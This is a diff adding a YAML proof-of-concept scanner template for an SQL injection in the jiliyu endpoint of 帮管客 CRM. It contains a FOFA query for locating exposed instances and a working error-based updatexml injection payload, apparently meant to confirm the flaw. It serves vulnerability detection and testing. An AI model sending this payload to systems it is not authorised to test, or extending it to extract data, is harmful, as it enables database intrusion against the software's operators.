@@ -1,0 +1,20 @@
+id: poc-yaml-bang-guan-ke-crm-jiliyu-sqli
+info:
+  name: 帮管客 CRM jiliyu SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 帮管客 CRM
+  fofa: app="帮管客-CRM"
+variables:
+  r1: random_int(1,10000)
+  r2: md5(r1)
+requests:
+- method: GET
+  path: /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5({{.r1}})),0x7e),1))
+  expression: 'status_code == 500 &&
+
+    contains(body, substr(r2,0,31))
+
+    '
+transport: http
